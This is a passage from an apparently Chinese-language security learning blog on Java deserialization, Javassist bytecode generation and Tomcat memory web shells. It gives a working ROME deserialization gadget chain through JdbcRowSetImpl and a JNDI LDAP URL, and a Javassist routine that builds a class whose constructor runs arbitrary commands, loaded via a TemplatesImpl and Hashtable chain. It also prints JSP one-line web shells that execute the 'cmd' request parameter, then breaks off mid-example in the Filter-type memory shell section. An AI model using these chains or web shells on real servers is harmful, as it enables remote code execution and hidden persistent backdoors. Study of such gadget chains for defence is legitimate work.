<p><img src="https://luokuang1.github.io/images/rome5.png" width="95%" height="80%"></p>
<p>而lookup方法里面的值为dataSource</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>poc构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:9999/test&quot;</span>;</span><br><span class="line">    jdbcRowSet.setDataSourceName(url);</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    Class c=badAttributeValueExpException.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">    Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">    aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    aa.set(toStringBean,jdbcRowSet);</span><br><span class="line">    serialized(badAttributeValueExpException,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>javassist基础知识学习</title>
    <url>/2025/02/09/javassist%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="前置知识介绍"><a href="#前置知识介绍" class="headerlink" title="前置知识介绍"></a>前置知识介绍</h3><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，或者直接创建一个新的类，这个过程就类似java的反射调用，但是Javassist一般用于对于字节码文件的修改</p>
<h3 id="基础知识介绍"><a href="#基础知识介绍" class="headerlink" title="基础知识介绍"></a>基础知识介绍</h3><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>ClassPool为CtClass对象的容器。要创建一个CtClass对象必须通过ClassPool来获取，创建ClassPool的方法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool=ClassPool.getDefault();</span><br></pre></td></tr></table></figure>
<p>对于CtClass的获取，可以直接通过makeClass来创建一个新的类赋值，还可以通过get方法来进行获取，但是在一些特殊情况将无法获取到类，由于ClassPool.getDfault()获取的ClassPool使用JVM的类搜索的路径，如果程序运行在JBoss或者Tomcat等web服务器上就可能找不到自己定义的类，这里就需要手动输入路径来进行获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pool.getDefault().insertClassPath(<span class="string">&quot;/path/to/your/classes&quot;</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test.class));</span><br></pre></td></tr></table></figure>
<h4 id="CtClass及相关用法"><a href="#CtClass及相关用法" class="headerlink" title="CtClass及相关用法"></a>CtClass及相关用法</h4><p>CtClass可以看做一个加强版的class对象，但是CtClass需要以ClassPool为容器来获取</p>
<p>通常的获取方式为ClassPool.get(ClassName)，这里就得先创建一个ClassPool容器。CtClass是核心，对于创建属性，方法或者构造器都是基于CtClass来进行的</p>
<p>一般获取用法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简单创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;test&quot;</span>)<span class="comment">//在默认包下进行创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;java.test&quot;</span>)<span class="comment">//表示创建在指定包下</span></span><br><span class="line">pool.get(<span class="string">&quot;test&quot;</span>)<span class="comment">//获取一个已存在的类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指定父类创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;test&quot;</span>,pool.get(person.class.getName()))<span class="comment">//表示test继承父类person</span></span><br><span class="line"><span class="type">Ctclass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(person.class.getName());</span><br><span class="line">ctClass.setSuperclass(superClass);<span class="comment">//和上面一样</span></span><br></pre></td></tr></table></figure>
<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>CtMethod同理可以看做一个加强版的Method，这里可以通过CtClass.getDeclaredMethod(MethodName)方法来获取，或者直接通过new CtMethod(type,name,new CtClass[]{},ctclass)来创建一个CtMethod对象，它里面还支持对类中方法进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<p>符号含义$0,$1, $2, …$0 = this; $1 = args[1] …..$args方法参数数组.它的类型为 Object[]<script type="math/tex">所有实参。例如, m(</script>) 等价于 m(1,2,…)$cflow(…)cflow 变量$r返回结果的类型，用于强制类型转换$w包装器类型，用于强制类型转换$_返回值$sig类型为 java.lang.Class 的参数类型数组$type一个 java.lang.Class 对象，表示返回值类型$class一个 java.lang.Class 对象，表示当前正在修改的类</p>
<h4 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h4><p>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.25</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>下面一个小demo创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ublic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">aaa</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//创建一个CtClass容器ClassPool</span></span><br><span class="line">    ClassPool pool=ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Object.class));</span><br><span class="line">    <span class="comment">//在该包下创建一个person类</span></span><br><span class="line">    CtClass ctclass=pool.makeClass(<span class="string">&quot;person&quot;</span>);</span><br><span class="line">    <span class="comment">//设置属性</span></span><br><span class="line">    CtField ctfield=<span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>),<span class="string">&quot;name&quot;</span>,ctclass);</span><br><span class="line">    ctfield.setModifiers(Modifier.PRIVATE);</span><br><span class="line">    <span class="comment">//定义初始值</span></span><br><span class="line">    ctclass.addField(ctfield,CtField.Initializer.constant(<span class="string">&quot;luokuang&quot;</span>));</span><br><span class="line">    <span class="comment">//创建一个有参构造方法</span></span><br><span class="line">    CtConstructor ctconstructor=<span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,ctclass);</span><br><span class="line">    ctconstructor.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    <span class="comment">//$1表示第一个参数，这里进行构造方法体的创建</span></span><br><span class="line">    ctconstructor.setBody(<span class="string">&quot;&#123; this.name=$1; &#125;&quot;</span>);</span><br><span class="line">    ctclass.addConstructor(ctconstructor);</span><br><span class="line">    <span class="comment">//创建一个方法</span></span><br><span class="line">    CtMethod ctMethod=<span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;print&quot;</span>,<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctclass);</span><br><span class="line">    ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    ctMethod.setBody(<span class="string">&quot;&#123; System.out.println(this.name);&#125;&quot;</span>);</span><br><span class="line">    ctclass.addMethod(ctMethod);</span><br><span class="line">    <span class="comment">//将类创建为一个class字节码文件</span></span><br><span class="line">    ctclass.writeFile(<span class="string">&quot;D:\\javadm\\javassist\\src\\main\\java&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    aaa();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建的字节码文件</p>
<p><img src="https://luokuang1.github.io/images/javassist1.png" width="95%" height="80%"></p>
<h4 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h4><p>创建一个简单的恶意字节码文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setter</span><span class="params">(String cmd)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ClassPool pool=ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">    CtClass cc=pool.makeClass(<span class="string">&quot;rce&quot;</span>);</span><br><span class="line">    cc.setSuperclass(superClass);</span><br><span class="line">    String statics=<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;); &#125;&quot;</span>;</span><br><span class="line">    CtConstructor ctConstructor=<span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,cc);</span><br><span class="line">    ctConstructor.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line">    cc.addConstructor(ctConstructor);</span><br><span class="line">    cc.writeFile(<span class="string">&quot;D:\\javadm\\javassist\\src\\main\\java&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建的恶意字节码文件</p>
<p><img src="https://luokuang1.github.io/images/javassist2.png" width="95%" height="80%"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/rce.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.hashCode();</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(equalsBean,<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(hashtable,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line"><span class="comment">//        setter(&quot;calc&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马</title>
    <url>/2025/02/20/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSP是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</span><br><span class="line">JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</span><br><span class="line">当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页</span><br></pre></td></tr></table></figure>
<p>文件格式如下，这里也有点像html等前端语言</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;% 代码逻辑 %&gt;</span><br></pre></td></tr></table></figure>
<p>这里也等价于xml语言中的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure>
<p>一个简单的用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;test1&lt;/h2&gt;</span><br><span class="line">&lt;% String name=<span class="string">&quot;hello world&quot;</span>;%&gt;</span><br><span class="line">&lt;% out.println(name); %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p>
<p>指令描述&lt;%@ page … %&gt;定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等&lt;%@ include … %&gt;包含其他文件&lt;%@ taglib … %&gt;引入标签库的定义，可以是自定义标签</p>
<p>JSP的注释</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure>
<p>JSP内置对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</span><br><span class="line">  由 JSP 规范提供，不用编写者实例化</span><br><span class="line">  通过 Web 容器实现和管理</span><br><span class="line">  所有 JSP 页面均可使用</span><br><span class="line">  只有在脚本元素的表达式或代码段中才能使用</span><br></pre></td></tr></table></figure>
<p>对象类型描述requestjavax.servlet.http.HttpServletRequest获取用户请求信息responsejavax.servlet.http.HttpServletResponse响应客户端请求，并将处理信息返回到客户端responsejavax.servlet.jsp.JspWriter输出内容到 HTML 中sessionjavax.servlet.http.HttpSession用来保存用户信息applicationjavax.servlet.ServletContext所有用户共享信息configjavax.servlet.ServletConfig这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数pageContextjavax.servlet.jsp.PageContextJSP 的页面容器，用于访问 page、request、application 和 session 的属性pagejavax.servlet.jsp.HttpJspPage类似于 Java 类的 this 关键字，表示当前 JSP 页面exceptionjava.lang.Throwable该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</p>
<p>下面一个简单的一句话木马例子,但是是无回显的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">    Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>下面是有回显的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Tomcat框架学习"><a href="#Tomcat框架学习" class="headerlink" title="Tomcat框架学习"></a>Tomcat框架学习</h2><p>相关链接：<a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p>
<p>这里其实是javaweb的知识体系，在配置一个web项目时，一般多采用Tomcat来搭建，这里可以把Tomcat看成是Web服务器+Servlet容器</p>
<p>Tomcat能够通过Connector组件接收并解析HTTP请求，然后将一个ServletRequest对象发送给Container处理。容器处理完之后会将响应封装成ServletRespone返回给Connector，然后Connector再将ServletRespone解析为HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信</p>
<p>下面是Tomcat框架图：</p>
<p><img src="/images/tomcat1.png" width="100%" height="80%"></p>
<p>由整个图可以看出来Tomcat Server的组成可以分为3个,Service Connector Container</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">简单说明一下</span></span><br><span class="line"><span class="comment">Service的作用：为连接器与引擎的桥梁，作为中间层，将多个连接器与一个引擎绑定在一起，确保请求能够正确地从连接器传递到引擎</span></span><br><span class="line"><span class="comment">Connector的作用：用于连接客户端与Tomcat核心组键Container的交互</span></span><br><span class="line"><span class="comment">Container的作用：它是Tomcat核心，主要负责管理Servlet的生命周期、处理请求和响应等关键功能</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>在Container里面包含四种子容器：Engine、Host、Context和Wrapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Engine: 可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host</span><br><span class="line">Host: 可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。</span><br><span class="line">Context: 又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(/)</span><br><span class="line">Wrapper: 是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理  Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收</span><br></pre></td></tr></table></figure>
<h2 id="JavaWeb三大组件"><a href="#JavaWeb三大组件" class="headerlink" title="JavaWeb三大组件"></a>JavaWeb三大组件</h2><p>这里简单介绍一下</p>
<p><strong>Servlet</strong></p>
<p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成RequestSerclet对象并发送到对应的Servlet上进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Servlet的生命周期分为如下五个阶段</span><br><span class="line">加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</span><br><span class="line">初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象</span><br><span class="line">处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求</span><br><span class="line">销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</span><br><span class="line">卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作</span><br></pre></td></tr></table></figure>
<p><strong>Filter</strong></p>
<p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。下面是Filter在Server中的调用流程图</p>
<p><img src="/images/tomcat2.png" width="100%" height="80%"></p>
<p><strong>Listener</strong></p>
<p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">下面有几个与Listener相关的概念</span><br><span class="line">事件：某个方法被调用，或者属性的改变</span><br><span class="line">事件源：被监听的对象（如ServletContext、requset、方法等）</span><br><span class="line">监听器：用于监听事件源，当发生事件时会触发监听器</span><br></pre></td></tr></table></figure>
<p>监听器的分类</p>
<p>监听器一共有如下8种</p>
<p>事件源监听器描述ServletContextServletContextListener用于监听 ServletContext 对象的创建与销毁过程HttpSessionHttpSessionListener用于监听 HttpSession 对象的创建和销毁过程ServletRequestServletRequestListener用于监听 ServletRequest 对象的创建和销毁过程ServletContextServletContextAttributeListener用于监听 ServletContext 对象的属性新增、移除和替换HttpSessionHttpSessionAttributeListener用于监听 HttpSession 对象的属性新增、移除和替换ServletRequestServletRequestAttributeListener用于监听 HttpServletRequest 对象的属性新增、移除和替换HttpSessionHttpSessionBindingListener用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件HttpSessionHttpSessionActivationListener用于监听 HttpSession 中对象活化和钝化的过程</p>
<p>这里三者的加载顺序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Listener-&gt;Filter-&gt;Servlet</span><br></pre></td></tr></table></figure>
<p>前置知识</p>
<p>根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上 调式时候需要导入对应tomcat版本的jar包</p>
<h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>相关链接：<a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<p><strong>前置知识</strong></p>
<p>根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
<p>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">8.5</span><span class="number">.31</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>根据上面的前置知识，这里可以分为Filter型，Listener型，Servlet型</p>
<h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>首先创建一个普通的Filter例子,前提是先创建一个对应的路由</p>
<p>Servlet服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/web1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;this is web1&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span 